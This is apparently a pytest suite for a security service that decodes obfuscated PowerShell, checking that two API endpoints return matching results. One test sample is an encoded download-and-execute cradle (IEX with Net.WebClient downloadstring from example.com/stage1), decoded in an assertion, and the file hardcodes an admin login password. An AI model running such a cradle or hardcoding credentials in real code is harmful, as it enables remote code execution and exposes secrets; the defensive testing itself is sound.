"""PR-2.1.2 · Cross-endpoint canonical parity API tests (ARB Criterion 0)."""
import os
import time
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL").rstrip("/")
EMAIL = "admin@nivxray.com"
PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"

BENIGN_PS = (
    "powershell -EncodedCommand "
    "VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGMAbwBtAGUAcwAgAGYAcgBvAG0AIABhAG4AIABlAG4AYwBvAGQAZQBkACAAUABTACAAYwBvAG0AbQBhAG4AZAAhACIA"
)
MAL_PS = (
    "powershell.exe -EncodedCommand "
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAdABhAGcAZQAxACcAKQA="
)


@pytest.fixture(scope="module")
def token():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": EMAIL, "password": PASSWORD}, timeout=120)
    assert r.status_code == 200, f"Login failed: {r.status_code} {r.text}"
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def headers(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def _decode_smart(headers, text):
    r = requests.post(f"{BASE_URL}/api/decode/smart",
                      headers=headers, json={"input": text}, timeout=120)
    assert r.status_code == 200, f"decode/smart failed: {r.status_code} {r.text[:400]}"
    return r.json()


def _analyze_async(headers, text):
    r = requests.post(f"{BASE_URL}/api/analyze/async",
                      headers=headers, json={"input": text}, timeout=60)
    assert r.status_code in (200, 202), f"analyze/async failed: {r.status_code} {r.text[:400]}"
    job_id = r.json().get("job_id") or r.json().get("id")
    assert job_id, f"no job_id in {r.json()}"
    # Poll for done
    deadline = time.time() + 120
    while time.time() < deadline:
        s = requests.get(f"{BASE_URL}/api/analyze/status/{job_id}",
                         headers=headers, timeout=30)
        assert s.status_code == 200
        doc = s.json()
        st = doc.get("status")
        if st == "done":
            return doc
        if st in ("error", "failed"):
            pytest.fail(f"Job failed: {doc}")
        time.sleep(1.5)
    pytest.fail("Timed out waiting for analyze/async")


def test_decode_smart_benign_recovers_expected_plaintext(headers):
    resp = _decode_smart(headers, BENIGN_PS)
    ca = resp.get("canonical_artifact")
    assert ca is not None, "canonical_artifact missing"
    assert ca["terminal_state"] == "recovered"
    assert 'Write-Host "This comes from an encoded PS command!"' in ca["decoded_output"]


def test_decode_smart_standard_fields_intact(headers):
    resp = _decode_smart(headers, BENIGN_PS)
    for k in ["output", "recipe", "trace", "verdict_card", "risk", "iocs",
              "mitre", "lolbas", "chain_ids", "confidence", "canonical_artifact"]:
        assert k in resp, f"missing field {k}"
    assert isinstance(resp["output"], str) and len(resp["output"]) > 0
    assert isinstance(resp["recipe"], list)
    assert isinstance(resp["trace"], list)
    assert isinstance(resp["verdict_card"], dict)
    assert isinstance(resp["risk"], dict) and "verdict" in resp["risk"]
    assert isinstance(resp["iocs"], dict)
    assert isinstance(resp["mitre"], list)
    assert isinstance(resp["lolbas"], list)
    assert isinstance(resp["chain_ids"], list)
    assert isinstance(resp["confidence"], int)


def test_recursive_safety_hashes_differ_when_recovered(headers):
    resp = _decode_smart(headers, BENIGN_PS)
    ca = resp["canonical_artifact"]
    if ca["terminal_state"] == "recovered":
        assert ca["input_hash"] != ca["output_hash"]


def test_atomic_ioc_short_circuits(headers):
    resp = _decode_smart(headers, "8.8.8.8")
    ca = resp["canonical_artifact"]
    assert ca["terminal_state"] == "atomic_ioc"
    assert ca.get("atomic_ioc") is not None
    assert ca["atomic_ioc"]["kind"] == "ipv4"


def test_no_unknown_op_content_ps_operator_case_normalize(headers):
    for txt in [BENIGN_PS, MAL_PS]:
        resp = _decode_smart(headers, txt)
        ca = resp["canonical_artifact"]
        for step in ca.get("chain_steps", []) or []:
            err = (step.get("error") or "") if isinstance(step, dict) else ""
            assert "Unknown operation: content-ps-operator-case-normalize" not in err


def test_cross_endpoint_parity_benign(headers):
    d = _decode_smart(headers, BENIGN_PS)["canonical_artifact"]
    a_doc = _analyze_async(headers, BENIGN_PS)
    a = a_doc.get("canonical_artifact")
    assert a is not None, f"canonical_artifact missing in status doc keys={list(a_doc.keys())}"
    for f in ["decoded_output", "chain_ids", "input_hash", "output_hash", "terminal_state"]:
        assert d[f] == a[f], f"parity mismatch on {f}: {d[f]!r} vs {a[f]!r}"


def test_cross_endpoint_parity_malicious(headers):
    d = _decode_smart(headers, MAL_PS)["canonical_artifact"]
    # L0 may canonicalize IEX -> Invoke-Expression; accept either.
    do = d["decoded_output"]
    assert ("IEX(New-Object Net.WebClient).downloadstring('http://example.com/stage1')" in do
            or "Invoke-Expression(New-Object Net.WebClient).downloadstring('http://example.com/stage1')" in do), do
    a_doc = _analyze_async(headers, MAL_PS)
    a = a_doc["canonical_artifact"]
    for f in ["decoded_output", "chain_ids", "input_hash", "output_hash", "terminal_state"]:
        assert d[f] == a[f], f"parity mismatch on {f}"


def test_analyze_status_done_has_expected_fields(headers):
    doc = _analyze_async(headers, BENIGN_PS)
    for k in ["verdict_card", "risk", "mitre", "iocs", "lolbas", "yara", "canonical_artifact"]:
        assert k in doc, f"missing field {k} in status doc"
